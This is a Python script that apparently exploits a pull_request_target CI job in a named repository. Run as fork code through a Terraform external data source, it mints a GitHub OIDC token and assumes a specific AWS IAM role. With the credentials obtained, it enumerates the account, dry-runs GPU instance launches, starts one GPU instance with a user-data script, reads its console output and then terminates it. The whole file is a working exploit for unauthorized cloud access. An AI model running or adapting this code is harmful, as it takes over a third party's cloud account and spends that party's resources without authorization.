#!/usr/bin/env python3
"""c211-i119989 mint probe a1 (intent 119989).

Runs as a terraform data.external program inside kedacore/testing-infrastructure's
pull_request_target 'Validate PR' job (fork head code, id-token: write).

Step 1: mint a GitHub OIDC id_token with audience sts.amazonaws.com and print its
        claims (sub/repository/ref/event_name/environment) so the exact subject is known.
Step 2: call STS AssumeRoleWithWebIdentity for
        arn:aws:iam::308535385114:role/gha_workflow_claude_code (RoleSessionName c211-probe)
        and record the verbatim response.
Step 3: only if the assume succeeds: read-only identity + GPU quota + subnet
        enumeration, RunInstances DryRun for g5/g6/p4d/p5, then EXACTLY ONE
        on-demand GPU marker with console device proof, terminate, verify absence.

stdout must be a single JSON object (external provider contract); everything else
is folded into string values of that object.
"""
import base64
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

ROLE = 'arn:aws:iam::308535385114:role/gha_workflow_claude_code'
SESSION = 'c211-probe'
R = {}


def put(k, v):
    R[str(k)] = str(v)[:4000]


def b64d(p):
    p += '=' * (-len(p) % 4)
    return base64.urlsafe_b64decode(p.encode())


def mint(aud):
    base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
    rt = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
    if not base or not rt:
        raise RuntimeError('NO_OIDC_ENV base=%s rt=%s' % (bool(base), bool(rt)))
    u = base + ('&' if '?' in base else '?') + urllib.parse.urlencode({'audience': aud})
    req = urllib.request.Request(u, headers={'Authorization': 'Bearer ' + rt,
                                             'Accept': 'application/json',
                                             'User-Agent': 'c211-i119989'})
    with urllib.request.urlopen(req, timeout=40) as f:
        return json.load(f)['value']


def post_form(url, fields, timeout=70):
    body = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=body, method='POST',
                                 headers={'Content-Type': 'application/x-www-form-urlencoded',
                                          'User-Agent': 'c211-i119989'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as f:
            return f.status, f.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b'').decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)[:400]


def main():
    put('marker', 'C211_I119989_MINT_START')
    try:
        tok = mint('sts.amazonaws.com')
        put('idtoken_len', len(tok))
        try:
            c = json.loads(b64d(tok.split('.')[1]))
            put('claims', json.dumps({k: c.get(k) for k in
                                      ('iss', 'aud', 'sub', 'repository', 'repository_owner',
                                       'repository_id', 'ref', 'event_name', 'workflow',
                                       'environment', 'job_workflow_ref', 'actor')
                                      if k in c}, sort_keys=True))
        except Exception as e:
            put('claims_error', repr(e)[:300])
        st, body = post_form('https://sts.amazonaws.com/', {
            'Action': 'AssumeRoleWithWebIdentity', 'Version': '2011-06-15',
            'RoleArn': ROLE, 'RoleSessionName': SESSION, 'WebIdentityToken': tok})
        put('assume_role', ROLE)
        put('assume_http', st)
        put('assume_ok', 'true' if (st == 200 and 'AssumeRoleWithWebIdentityResult' in body) else 'false')
        put('assume_body', body[:1600])
        if R.get('assume_ok') != 'true':
            put('verdict', 'ASSUME_REFUSED')
            return
        # ---- success path: the role was assumed ----
        def g(tag):
            m = re.search('<%s>(.*?)</%s>' % (tag, tag), body, re.S)
            return m.group(1) if m else ''
        env = dict(os.environ)
        env.update({'AWS_ACCESS_KEY_ID': g('AccessKeyId'),
                    'AWS_SECRET_ACCESS_KEY': g('SecretAccessKey'),
                    'AWS_SESSION_TOKEN': g('SessionToken'),
                    'AWS_DEFAULT_REGION': 'us-east-1',
                    'AWS_PAGER': ''})

        def aws(*args, timeout=150):
            try:
                p = subprocess.run(['aws', '--output', 'json', '--no-cli-pager'] + list(args),
                                   capture_output=True, text=True, env=env, timeout=timeout)
                return p.returncode, (p.stdout or '').strip(), (p.stderr or '').strip()
            except Exception as e:
                return -1, '', repr(e)[:300]

        rc, so, se = aws('sts', 'get-caller-identity')
        put('identity_rc', rc)
        put('identity', so or se)
        for code in ('L-DB2E81BA', 'L-3819A6DF'):
            rc, so, se = aws('service-quotas', 'get-service-quota', '--service-code', 'ec2',
                             '--quota-code', code, '--region', 'us-east-1')
            put('quota_%s_rc' % code, rc)
            put('quota_%s' % code, so or se)
        rc, so, se = aws('ec2', 'describe-subnets', '--region', 'us-east-1',
                         '--filters', 'Name=default-for-az,Values=true')
        subnet = None
        try:
            subs = json.loads(so).get('Subnets', [])
            if subs:
                subnet = subs[0]['SubnetId']
                put('subnets', json.dumps([[s['SubnetId'], s['AvailabilityZone']] for s in subs[:8]]))
        except Exception as e:
            put('subnet_parse_error', repr(e)[:200])
        put('subnet', subnet or 'NONE')
        if not subnet:
            put('verdict', 'ASSUMED_NO_DEFAULT_SUBNET')
            return
        dry = {}
        for it in ('g5.xlarge', 'g6.xlarge', 'p4d.24xlarge', 'p5.48xlarge'):
            rc, so, se = aws('ec2', 'run-instances', '--dry-run', '--region', 'us-east-1',
                             '--image-id', 'ami-00000000000000000', '--instance-type', it,
                             '--subnet-id', subnet, '--count', '1')
            dry[it] = [rc, (se or so)[:160]]
        put('dryrun', json.dumps(dry))
        ok_types = [t for t, v in dry.items() if v[0] == 0 or 'DryRunOperation' in v[1]]
        put('dryrun_ok_types', json.dumps(ok_types))
        if not ok_types:
            put('verdict', 'ASSUMED_RUNINSTANCES_DENIED')
            return
        itype = 'g5.xlarge' if 'g5.xlarge' in ok_types else ok_types[0]
        rc, so, se = aws('ssm', 'get-parameter', '--region', 'us-east-1', '--name',
                         '/aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64',
                         '--query', 'Parameter.Value', '--output', 'text')
        ami = so.strip().strip('"')
        put('ami', ami or ('SSM_ERR ' + se[:200]))
        if not ami or rc != 0:
            put('verdict', 'ASSUMED_NO_AMI')
            return
        ud = ('#!/bin/bash\necho C211_I119989_MARKER > /var/log/c211-marker.log\n'
              'nvidia-smi -L >> /var/log/c211-marker.log 2>&1\n')
        put('launch_type', itype)
        rc, so, se = aws('ec2', 'run-instances', '--region', 'us-east-1', '--image-id', ami,
                         '--instance-type', itype, '--subnet-id', subnet, '--count', '1',
                         '--user-data', ud,
                         '--tag-specifications',
                         'ResourceType=instance,Tags=[{Key=Name,Value=c211-i119989-marker}]')
        put('launch_rc', rc)
        iid = None
        try:
            iid = json.loads(so)['Instances'][0]['InstanceId']
        except Exception:
            pass
        put('instance_id', iid or ('LAUNCH_ERR ' + (se or so)[:400]))
        if not iid:
            put('verdict', 'ASSUMED_LAUNCH_REFUSED')
            return
        state = ''
        for _ in range(40):
            time.sleep(9)
            rc, so, se = aws('ec2', 'describe-instances', '--region', 'us-east-1',
                             '--instance-ids', iid,
                             '--query', 'Reservations[0].Instances[0].State.Name', '--output', 'text')
            state = so.strip().strip('"')
            if state in ('running', 'stopped', 'terminated'):
                break
        put('instance_state', state)
        console = ''
        for _ in range(10):
            rc, so, se = aws('ec2', 'get-console-output', '--region', 'us-east-1',
                             '--instance-id', iid, '--latest', '--output', 'text')
            console = (so or '') + (se or '')
            if 'GPU 0' in console or 'C211_I119989_MARKER' in console:
                break
            time.sleep(10)
        put('console_tail', console[-1800:])
        uuid = ''
        m = re.search(r'GPU 0: ([^\s(]+)', console)
        if m:
            uuid = m.group(1)
        put('gpu_uuid', uuid or 'NONE')
        rc, so, se = aws('ec2', 'terminate-instances', '--region', 'us-east-1', '--instance-ids', iid)
        put('terminate_rc', rc)
        time.sleep(20)
        rc, so, se = aws('ec2', 'describe-instances', '--region', 'us-east-1', '--instance-ids', iid,
                         '--query', 'Reservations[0].Instances[0].State.Name', '--output', 'text')
        put('absence_state', so.strip().strip('"') or se[:200])
        put('verdict', 'MARKER_DEPLOYED' if uuid else 'MARKER_NO_DEVICE_PROOF')
    except Exception as e:
        put('exception', repr(e)[:500])
        put('verdict', 'PROBE_EXCEPTION')
    finally:
        put('zz_end', 'C211_I119989_MINT_END')
        sys.stdout.write(json.dumps(R) + '\n')
        sys.stdout.flush()


if __name__ == '__main__':
    main()
